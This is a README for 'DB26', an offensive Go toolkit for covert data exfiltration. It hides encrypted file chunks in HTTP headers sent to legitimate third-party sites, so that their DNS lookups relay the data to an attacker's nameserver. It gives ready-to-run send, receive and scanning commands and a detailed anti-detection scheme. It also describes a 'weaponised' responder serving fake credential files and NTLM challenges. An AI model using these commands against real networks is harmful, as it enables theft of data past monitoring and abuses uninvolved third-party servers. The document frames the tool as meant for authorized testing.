# DB26: DataBouncing Toolkit

**Indirect data exfiltration. Data enters as HTTP headers via TCP/HTTPS to legitimate third-party domains. Those domains process the headers, triggering UDP/DNS lookups that carry the data to the receiver. The sender never touches DNS - the third party exfiltrates the data on the sender's behalf without knowing it.**

DataBouncing created by [John Carroll](https://thecontractor.io/data-bouncing/) and [David Mound](https://databouncing.io) - David was instrumental in the initial discovery. First public tooling implementation by [Nick Dunn](https://github.com/N1ckDunn/DataBouncing). This is a complete Go reimplementation with significant performance and operational improvements.

## How It Works

HTTP headers like `Host`, `X-Forwarded-For`, and `Referer` are processed by web servers, proxies, CDNs, and WAFs. Many of these services resolve hostnames found in headers via DNS. DataBouncing exploits this behaviour to create an indirect data channel.

```
 ┌────────────┐        ┌────────────────────┐        ┌────────────────┐
 │            │  TCP   │  Third-party       │  UDP   │                │
 │   Sender   │───────▶│  (e.g. adobe.com)  │───────▶│   OOB Server   │
 │            │  HTTPS │                    │  DNS   │                │
 └────────────┘        └────────────────────┘        └───────┬────────┘
       │                        │                            │
       │ GET / HTTP/1.1         │ Server processes           │ DNS query
       │ Host: data.corr.oob   │ the Host header            │ arrives with
       │ X-Forwarded-For: ...  │ and resolves the           │ embedded data
       │ Referer: ...          │ hostname via DNS            │
       │                        │                            │
       │  Legitimate HTTPS      │  DNS lookup to             │
       │  to a trusted domain   │  attacker-controlled       ▼
       │                        │  nameserver          ┌────────────────┐
       │  No DNS from sender    │                      │                │
       │  No direct connection  │                      │   Receiver     │
       │  to receiver           │                      │                │
       │                        │                      │  Reads log     │
       └────────────────────────┘                      │  Deshuffles    │
                                                       │  Decrypts      │
         TCP/HTTPS in ──────────▶ UDP/DNS out          │  Reassembles   │
         Sender's traffic        Third party's traffic │  Verifies      │
                                                       └────────────────┘
```

**No direct connection between sender and receiver.** Data travels through legitimate internet infrastructure as normal-looking HTTP requests and DNS queries.

## Contents

```
DB26/
├── cmd/
│   ├── recruiter/        # Candidate discovery - finds proven domain+header pairs
│   ├── db26-send/        # Sender - encrypts, chunks, shuffles, bounces data
│   ├── db26-recv/        # Receiver - collects, deshuffles, reassembles, decrypts
│   ├── responder/        # Weaponised HTTP/HTTPS response server (SSRF/auth)
│   ├── report/           # JSONL report generator from run data
│   ├── ntlmtrap/         # NTLM/Basic auth challenge server
│   ├── dashboard-web/    # Real-time web dashboard (SSE)
│   └── dashboard/        # TUI dashboard (bubbletea)
│
├── internal/
│   ├── config/           # CLI flag parsing and validation
│   ├── headers/          # HTTP header definitions (15 injection positions)
│   ├── probe/            # fasthttp client - fire-and-forget HTTP probes
│   ├── worker/           # Goroutine pool with rate limiting
│   ├── callback/         # Interactsh interaction parsing
│   ├── correlate/        # Match DNS callbacks to probed domains
│   ├── logparser/        # Real-time interactsh log tailing and parsing
│   ├── auth/             # NTLM/Basic/Negotiate/Digest detection
│   ├── crypto/           # AES-256-GCM encryption + Argon2id key derivation
│   ├── wire/             # Wire format: shuffled fields, decoys, Base32, chunking
│   ├── intel/            # IP intelligence - ASN, GeoIP, reverse DNS, classification
│   ├── payloads/         # Polyglot payloads for SSRF/SSTI/XXE technology detection
│   ├── metrics/          # Atomic counters for real-time stats
│   ├── output/           # JSONL file writers
│   ├── preflight/        # Pre-flight dependency and environment checks
│   └── runconfig/        # Persistent config file (~/.db26/config.json)
│
├── deploy/
│   └── interactsh/       # VPS setup script, systemd unit, Cloudflare DNS guide
│
├── testdata/             # Sample domain lists for testing
├── GUIDE.md              # Full setup and usage guide
├── POST.md               # Campaign writeup and PoC results
└── Makefile
```

## Infrastructure Requirements

You need an **OOB server that you control**. This is non-negotiable - the receiver reads data from the server's logs.

**Recommended: Self-hosted [Interactsh](https://github.com/projectdiscovery/interactsh)**
- You own the domain, the server, and the logs
- Full DNS/HTTP/HTTPS/SMTP capture
- The `deploy/interactsh/setup.sh` script automates setup

**Other options:**
- Any self-hosted DNS listener where you control the log output
- Custom DNS server that logs all queries

**Will NOT work:**
- **Burp Collaborator (default)** - You don't control the server or have raw log access. The receiver needs to parse DNS query data from the server log. If you must use Collaborator, you need Burp Suite Pro with a [private Collaborator server](https://portswigger.net/burp/documentation/collaborator/deploying) that you host yourself and can access the logs.
- **Public interact.sh** - Same problem. You can't read the server-side log. The polling API doesn't reliably deliver all interactions under load.
- **Any OOB service where you only get notifications** - The receiver needs the raw DNS query content, not just "a query was received."

**The key requirement:** You must be able to read the full DNS query (including all subdomain labels) from the server log. That's where the data is.

### Domain Setup

1. Register a domain (e.g. `oob.yourdomain.com`)
2. Create DNS records pointing to your server:
   - `A` record: `ns1.yourdomain.com` → `<server IP>`
   - `NS` record: `oob.yourdomain.com` → `ns1.yourdomain.com`
3. Run interactsh: `interactsh-server -domain oob.yourdomain.com -ip <server IP>`
4. Verify: `dig test.oob.yourdomain.com` should resolve to your server

See `deploy/interactsh/cloudflare-dns.md` for Cloudflare-specific instructions.

## Quick Start

### Build

```bash
go build -o recruiter  ./cmd/recruiter/
go build -o db26-send  ./cmd/db26-send/
go build -o db26-recv  ./cmd/db26-recv/
```

### 1. Recruit - Find proven bounce points

```bash
./recruiter -d domains.txt -s https://your-oob.domain -t <token> \
  --run-dir ./runs/$(date +%Y%m%d) -w 2000 --rps 5000 --timeout 1 -v
```

Output: `databouncing_candidates.jsonl` - domain + proven header pairs:
```json
{"domain":"example.com","headers":{"host":3,"xff":1},"callbacks":4}
```

### 2. Send - Exfiltrate data through proven candidates

```bash
./db26-send -file secret.pdf -passphrase "strong-key" \
  -candidates candidates.jsonl \
  -corr-ids <fresh-correlation-id> \
  -retries 10 -decoy-rate 0.2
```

Or target specific domains manually:
```bash
./db26-send -file data.txt -passphrase "key" \
  -target "adobe.com,host,cdn.net,xff" \
  -corr-ids <id>
```

### 3. Receive - Collect and reassemble

```bash
./db26-recv -passphrase "strong-key" \
  -salt <hex-from-sender> \
  -corr-ids <correlation-id> \
  -file-id <hex-from-sender> \
  -output ./received/ -enrich
```

## Command Reference

### recruiter

Scans domains to find which ones process HTTP headers and trigger DNS lookups.

```
recruiter [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-d`, `--domains` | *required* | Path to target domains file (one per line) |
| `-s`, `--server` | from config | Interactsh server URL |
| `-t`, `--token` | from config | Interactsh auth token |
| `-w`, `--workers` | `500` | Concurrent goroutine workers |
| `--rps` | `1000` | Max requests per second (rate limit) |
| `--timeout` | `2` | HTTP request timeout in seconds |
| `--grace` | `60` | Seconds to wait after probing for late DNS callbacks |
| `--run-dir` | from config | Output directory for this run's reports |
| `--https` | `true` | Also probe HTTPS (doubles probes, set `false` to skip) |
| `--oob-domain` | - | Use a pre-registered OOB domain instead of auto-registering |
| `--verify-headers` | `false` | Print headers for 3 domains and exit (debug mode) |
| `-v`, `--verbose` | `false` | Verbose output |

**Config file** (`~/.db26/config.json`) provides defaults for server, token, run-dir, and paths - so most flags are optional if configured.

### db26-send

Encrypts a file, chunks it, and bounces it through proven candidates.

```
db26-send [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-file` | *required* | File to exfiltrate |
| `-passphrase` | *required* | Encryption passphrase (shared with receiver) |
| `-candidates` | - | Proven candidates JSONL from recruiter |
| `-target` | - | Manual targets: `domain,header,domain,header,...` |
| `-corr-ids` | *required* | Correlation IDs (comma-separated, one per OOB domain) |
| `-oob-domains` | `oob.yourdomain.com` | OOB domains (comma-separated) |
| `-retries` | `5` | Send each chunk through N different candidates |
| `-decoy-rate` | `0.2` | Rate of decoy label injection (0 = none, 1 = every query) |
| `-jitter-min` | `50` | Minimum delay between sends (ms) |
| `-jitter-max` | `500` | Maximum delay between sends (ms) |
| `-timeout` | `2` | HTTP write timeout (seconds) |
| `-log` | `send_log.jsonl` | Send log output file |

**Must provide either `-candidates` or `-target` (or both).**

Examples:
```bash
# From recruiter results
db26-send -file secret.pdf -passphrase "key" -candidates proven.jsonl -corr-ids abc123

# Manual single target (restricted network)
db26-send -file data.txt -passphrase "key" -target "adobe.com,host" -corr-ids abc123

# Multiple manual targets with different headers
db26-send -file data.txt -passphrase "key" \
  -target "adobe.com,host,cdn.net,xff,proxy.org,ref" -corr-ids abc123

# Multi-domain spread
db26-send -file data.txt -passphrase "key" -candidates proven.jsonl \
  -oob-domains oob.yourdomain.com,exf.other.io -corr-ids corrA,corrB
```

### db26-recv

Reads the interactsh log, collects chunks, reassembles and decrypts.

```
db26-recv [flags]
```

| Flag | Default | Description |
|------|---------|-------------|
| `-passphrase` | *required* | Decryption passphrase (same as sender) |
| `-salt` | *required* | Session salt hex (printed by sender) |
| `-corr-ids` | *required* | Correlation IDs (comma-separated) |
| `-oob-domains` | `oob.yourdomain.com` | OOB domains (comma-separated) |
| `-file-id` | - | Extract specific file ID (hex). Omit to extract all |
| `-log` | `/var/log/interactsh/interactsh.log` | Path to interactsh server log |
| `-output` | `.` | Output directory for reassembled files |
| `-enrich` | `false` | Enrich resolver IPs with ASN/Geo/rDNS intel |

The sender prints the exact receiver command with all required values.

### responder

Weaponised HTTP/HTTPS response server. Serves crafted payloads on callback paths for SSRF/RFI/SSTI detection.

```
responder [output_dir]
```

- Listens on ports 80 (HTTP) and 443 (HTTPS, using interactsh wildcard cert)
- Only logs requests with a known correlation ID in the Host header (filters scanner noise)
- Serves per-path payloads: fake `.env`, `.git/config`, `phpinfo`, NTLM challenges, polyglot SSTI probes
- Proxies `/register`, `/poll`, `/deregister` to interactsh on port 8080

## Header Positions

The recruiter tests 15 HTTP header injection positions:

| Header | Prefix | Format |
|--------|--------|--------|
| Host | `host` | `data.oob.domain` |
| X-Forwarded-For | `xff` | `data.oob.domain` |
| X-Wap-Profile | `wafp` | `http://data.oob.domain/wap.xml` |
| Contact | `contact` | `root@data.oob.domain` |
| X-Real-IP | `rip` | `data.oob.domain` |
| True-Client-IP | `trip` | `data.oob.domain` |
| X-Client-IP | `xclip` | `data.oob.domain` |
| Forwarded | `ff` | `for=data.oob.domain` |
| X-Originating-IP | `origip` | `data.oob.domain` |
| Client-IP | `clip` | `data.oob.domain` |
| Referer | `ref` | `data.oob.domain` |
| From | `from` | `root@data.oob.domain` |
| Origin | `origin` | `https://data.oob.domain` |
| User-Agent | `ua` | `data.oob.domain` |
| n0x00 | `n0x00` | `data.oob.domain` |

The sender only uses headers that the recruiter proved work for each specific domain.

## Wire Format

Each chunk is encoded as DNS labels in **random order** (24 permutations):

```
Standard:  [fileID].[seq].[total].[base32data].[corrID].[oob.domain]
Shuffled:  [base32data].[total].[fileID].[seq].[corrID].[oob.domain]
With decoy: [seq].[DECOY].[base32data].[fileID].[total].[corrID].[oob.domain]
```

Fields identified by **unique length** - no fixed format signature:

| Field | Length | Varies per session |
|-------|--------|--------------------|
| fileID | 3-5 chars | Derived from key |
| seq | 6-8 chars | Derived from key |
| total | 9-11 chars | Derived from key |
| data | 16-40 chars | Base32 encoded |
| decoy | random | Random chars, random position |

Different encryption key = different field lengths = zero cross-session pattern.

## Anti-Detection

| Technique | Purpose |
|-----------|---------|
| Shuffled field order | No static wire format to signature |
| Decoy labels (10-30%) | Defeats label-count heuristics |
| Session-variable field lengths | Key-derived, changes every run |
| Multi-domain OOB | Traffic spread across N domains |
| Random jitter (50-500ms) | No timing pattern |
| Random candidate per chunk | No domain access pattern |
| Random header per candidate | Different position each time |
| AES-256-GCM encryption | Payload indistinguishable from random |
| Randomised chunk send order | Not sequential |
| Argon2id key derivation | Memory-hard, resistant to brute force |

## Campaign Results

| Metric | Value |
|--------|-------|
| Total probes sent | 35,065,138 |
| DNS callbacks received | 153,664,396 |
| Unique proven candidates | 11,479,375 |
| Recruiter throughput | 700+ domains/sec |
| Subdomain corpus (subfinder) | 9.8M |
| Root domains enumerated | 8,915 |
| Exfiltration capacity (single use) | ~246 MB |
| Reliable capacity (10x redundancy) | ~25 MB |

## Encryption

- **AES-256-GCM** - Authenticated encryption (confidentiality + integrity)
- **Argon2id** - Memory-hard key derivation (64MB, 3 iterations, 4 threads)
- **SHA-256** - File integrity checksums
- **12-byte random nonce** - Per encryption operation
- **Base32 (RFC 4648)** - DNS-safe encoding, case-insensitive

## Infrastructure

- **[Interactsh](https://github.com/projectdiscovery/interactsh)** - OOB callback server (DNS/HTTP/HTTPS/SMTP)
- **[Subfinder](https://github.com/projectdiscovery/subfinder)** - Passive subdomain enumeration
- **[fasthttp](https://github.com/valyala/fasthttp)** - High-performance HTTP client

## Credits

- [DataBouncing](https://databouncing.io) created by [John Carroll](https://thecontractor.io/data-bouncing/) and [David Mound](https://databouncing.io)
- [Original article](https://thecontractor.io/data-bouncing/) by John Carroll (The Contractor)
- [First public tooling implementation](https://github.com/N1ckDunn/DataBouncing) (Python) by Nick Dunn

- [Interactsh](https://github.com/projectdiscovery/interactsh) by ProjectDiscovery
- [Subfinder](https://github.com/projectdiscovery/subfinder) by ProjectDiscovery

## Disclaimer

This toolkit is for authorized security research, penetration testing, and educational purposes only. Only use against systems you have explicit permission to test.
